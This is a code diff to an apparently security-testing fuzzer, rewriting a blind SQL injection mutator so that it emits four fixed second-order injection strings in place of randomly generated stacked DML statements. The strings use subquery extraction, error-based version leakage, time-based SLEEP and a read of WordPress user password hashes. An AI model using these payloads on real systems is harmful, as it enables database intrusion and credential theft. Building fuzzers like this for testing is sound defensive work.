@@ -208,60 +208,22 @@ class SuperRandomMutator(ParamMutator):
         return mutated_string
     
 class BlindSQLiPayloadParamMutator(ParamMutator):
-    SCHEMA = {
-        "tables": {
-            "normal": ["users"],
-            "sensors": ["__phuzz_sensor_insert", "__phuzz_sensor_update", "__phuzz_sensor_delete"]
-        },
-        "columns": {
-            "users": ["id", "username", "password", "role"],
-            "__phuzz_sensor_insert": ["id", "marker"],
-            "__phuzz_sensor_update": ["id", "canary"],
-            "__phuzz_sensor_delete": ["id", "marker"]
-        }
-    }
-
-    def generate_random_dml(self):
-        """Sinh ngẫu nhiên các câu lệnh INSERT, UPDATE, hoặc DELETE hợp lệ dựa trên SCHEMA rút gọn"""
-        action = random.choice(["INSERT", "UPDATE", "DELETE"])
-        target_table = random.choice(self.SCHEMA["tables"]["normal"] + self.SCHEMA["tables"]["sensors"])
-        available_cols = self.SCHEMA["columns"][target_table]
-        
-        # Không thực hiện DELETE trên các bảng cảm biến để bảo toàn trạng thái
-        if target_table in self.SCHEMA["tables"]["sensors"] and action == "DELETE":
-            action = random.choice(["INSERT", "UPDATE"])
-        
-        if action == "INSERT":
-            cols_to_insert = [c for c in available_cols if c != "id"]
-            values = [f"'fuzz_{random.randint(1, 999)}'" for _ in cols_to_insert]
-            return f"INSERT INTO {target_table} ({', '.join(cols_to_insert)}) VALUES ({', '.join(values)})"
-            
-        elif action == "UPDATE":
-            cols_to_update = [c for c in available_cols if c != "id"]
-            if not cols_to_update:
-                return f"UPDATE {target_table} SET id = {random.randint(1000, 999999)}"
-            target_col = random.choice(cols_to_update)
-            new_val = f"'fuzz_up_{random.randint(1, 999)}'"
-            return f"UPDATE {target_table} SET {target_col} = {new_val} WHERE id = 1"
-            
-        elif action == "DELETE":
-            return f"DELETE FROM {target_table} WHERE id = {random.randint(1, 10)}"
-
     def mutate(self, string):
-        """
-        Thực hiện đột biến chuỗi mồi (Seed) thành duy nhất kịch bản ghi/xóa DML (INSERT, UPDATE, DELETE)
-        để kiểm thử trạng thái side-effect của database.
-        """
-        if not string:
-            string = "admin"
-        string_str = str(string).strip()
-        
-        # Bóc tách phần tiền tố gốc trước nháy đơn hoặc chấm phẩy
-        prefix = string_str.split(';')[0].split("'")[0].strip()
-        if not prefix:
-            prefix = "admin"
-
-        return f"{prefix}'; {self.generate_random_dml()}; -- '"
+        # Danh sách các payload đặc thù do người dùng yêu cầu để thực hiện kiểm thử Second-Order SQLi
+        test_payloads = [
+            # 1. Trích xuất token từ bảng cảm biến (Side-channel subquery)
+            "Company'), (999, 'HACK', (SELECT flag_token FROM phuzz_sensor)) -- '",
+            
+            # 2. Tiêm nhiễm lỗi vỡ cấu trúc truy xuất phiên bản MySQL (Error-based)
+            "A'), (999, 'ERR', EXTRACTVALUE(1, CONCAT(0x7e, @@version))) -- '",
+            
+            # 3. Kích hoạt ngủ đông cơ sở dữ liệu có điều kiện (Time-based)
+            "B'), (999, 'TIME', (SELECT SLEEP(5))) -- '",
+            
+            # 4. Tiêm nhiễm khai thác đánh cắp thông tin nhạy cảm từ bảng ngoài (Data Exfiltration)
+            "Evil'), (999, 'EXFIL', (SELECT user_pass FROM wp_users WHERE id=1)) -- '"
+        ]
+        return random.choice(test_payloads)
 
 
 #######
